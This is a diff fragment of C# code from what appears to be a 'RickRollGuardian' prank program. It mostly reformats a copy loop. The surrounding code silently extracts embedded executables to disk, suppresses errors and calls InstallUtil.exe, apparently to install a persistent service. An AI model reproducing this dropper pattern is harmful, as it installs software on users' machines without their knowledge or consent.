@@ -11,10 +11,7 @@ namespace RickRollGuardian {
             FileStream output = new FileStream(path, FileMode.Create);
             byte[] data = new byte[1024];
             int lengthEachRead;
-            while ((lengthEachRead = input.Read(data, 0, data.Length)) > 0) {
-                output.Write(data, 0, lengthEachRead);
-            }
-            output.Flush();
+            while ((lengthEachRead = input.Read(data, 0, data.Length)) > 0) output.Write(data, 0, lengthEachRead);
             output.Close();
         }
 
@@ -25,8 +22,7 @@ namespace RickRollGuardian {
             try {
                 if (!File.Exists(rickExe)) ExtractFile(new MemoryStream(Resources.RickAstley), rickExe);
                 if (!File.Exists(astleyExe)) ExtractFile(new MemoryStream(Resources.Astley_HelperSvc), astleyExe);
-            }
-            catch { }
+            } catch { }
             string scInstall = sysroot + "\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe";
             Process p = new Process();
             p.StartInfo.FileName = scInstall;
